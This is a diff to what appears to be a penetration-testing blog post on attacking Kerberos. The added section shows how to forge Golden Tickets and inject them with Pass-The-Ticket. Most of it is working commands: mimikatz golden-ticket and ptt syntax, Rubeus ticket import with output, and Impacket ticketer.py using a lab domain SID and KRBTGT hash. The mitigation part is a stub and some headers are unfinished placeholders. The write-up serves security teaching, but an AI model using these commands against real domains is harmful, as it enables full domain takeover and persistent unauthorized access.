@@ -1,7 +1,7 @@
 ---
 title: How To Attack Kerberos 101
 categories: [Windows,Kerberos,Active Directory,AS REP,Kerberoast,PowerView,Rubeus]
-published: false
+published: true
 ---
 
 In this article I will discuss all the primary attacks on Kerberos, how to enumerate for them & finally how to exploit them using a wide range of toolsets. I will also try my best to outline how to carry out these attacks from both a domain joined Windows box & an external Linux VM i/e an attackers platform.
@@ -15,7 +15,7 @@ Below is a list of the outlined attacks.
 - Kerberos User Enumeration & Brute Force
 - Silver Ticket
 - Golden Ticket
-- PTT (Pass-The-Ticket) / Ticket Injection
+- Methods to Injection & Pass-The-Ticket
 - Unconstrained Delegation Attacks
 - Constrained Delegation Attack
 
@@ -1007,4 +1007,163 @@ Let's go.
 >  '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
 >   '#####'                                    with  13 modules * * */
 > ```
+
+
+
+**Golden Ticket Requirements**
+
+```powershell
+Domain Name: m0chanAD.local
+Domain SID: S-1-5-21-1473643419-774954089-2222323452 (whoami /user)
+KRBTGT NTLM Hash: d7e2b80507ea074ad59f152a1ba20458
+ID: 500 (Administrator SID), 518 (Schema Admins), 519 (Enterprise Admin)
+```
+
+
+
+**Generate Ticket**
+
+```powershell
+mimikatz.exe 
+kerberos::golden /domain:m0chanAD.local /sid:<domain-sid> /krbtgt:<krbtgt> /id:500 /user:FakeAdmin /ticket persistance4life.kirbi
+```
+
+
+
+**PTT**
+
+As you can see in the above examples I have applied the `/ptt` flag which will automatically inject the ticket into my current session but we can choose to output it to a file with the `/ticket` flag which will output a `ticket.kirbi` file by default unless directly specified.
+
+
+
+We can then use this `kirbi` ticket for a certain level of persistence and/or inject them with Rubeus which Iw ill display below.
+
+```
+mimikatz.exe
+kerberos::ptt persistance4life.kirbi
+```
+
+
+
+## [](#header-5)Injecting Ticket with Rubeus
+
+
+
+> Rubeus is effectively a Kerberos attack tool which we will cover a lot in this article that is developed in C#/.NET meaning it is a lot harder for defenders to detect it it's reflectively loaded using something like Cobalt's `execute-assembly` or `SILENTTRINITY` You can also reflectively load it from PowerShell but I will be covering `.NET` in greater detail in a future article. 
+>
+> https://github.com/GhostPack/Rubeus
+
+
+
+***Disclaimer : This is an exact copy of this section under Silver Tickets***
+
+
+
+As we have discussed Rubeus loads in this article already under `Kerberoasting` and `AS REP` I will jump straight to the chase. 
+
+
+
+We can use Rubeus to inject Silver Tickets into our session by 2 methods, `.kirbi` file or a Base64 of said `.kirbi` file which I find very useful.
+
+
+
+Inject `.kirbi` from Disk
+
+```powershell
+PS C:\Users\m0chan> .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi
+
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+PS C:\Users\m0chan> .\Rubeus.exe klist
+```
+
+
+
+Inject `.kirbi` from Base64 Blog
+
+```
+PS C:\Users\m0chan> .\Rubeus.exe ptt /ticket:BASE64BLOBHERE
+
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+PS C:\Users\m0chan> .\Rubeus.exe klist
+```
+
+
+
+## [](#header-3)From Linux 
+
+
+
+I am going to try my best here to show how you can use Golden Tickets/Inject them etc from Linux but truthfully this is a learning experience for me as I 99% of the time carry this out on Windows bases platforms and/or **Domain-Joined Machines**
+
+
+
+***Disclaimer: This is almost a identical copy/paste from Silver Ticket Section besides Syntax***
+
+
+
+## [](#header-5)ticketer.py
+
+Here we find ourselves again on a Linux machine wanting to do Windows things so where do we look? You have one guess. Yep you're right. **Impacket** has a script called `ticketer.py`
+
+
+
+I truthfully just learnt about this script after doing some Googling so I am not expert on it's internals but after a brief overview it appears as if `ticketer.py` allows you to generate `Golden Tickets`
+
+
+
+The Syntax for Ticketer is as follows
+
+```python
+m0chan@kali:/scripts/> python ticketer.py -nthash d7e2b80507ea074ad59f152a1ba20458 -domain-sid S-1-5-21-1473643419-774954089-2222323452 -domain m0chanAD.local -id 500 FakeAdmin 
+    
+#This will export a .ccache file which can be imported by executing the below command
+
+KRB5CCNAME=/scripts/m0chan.ccache 
+
+We can then pass the -K switch through with any other Impacket scripts and it will automatically use the cached kerberos ticket, such as PSEXec, WMIExec (i think).
+```
+
+
+
+## [](#header-3)Golden Tickets + SID History 
+
+*talk about sid filtering*
+
+
+
+## [](#header-3)Mitigation / Defending Golden Tickets
+
+
+
+Golden Tickets are really hard to monitor for as effectively they are just legitamate`TGT` tickets that are signed/encrypted by the official `KRBTGT` account.  However by default Mimikatz will generate a golden ticket with a life-span of 10 years but can easily be detected. 
+
+
+
+
+
+## [](#header-2) Pass-The-Ticket / Ticket Dump
+
+
 
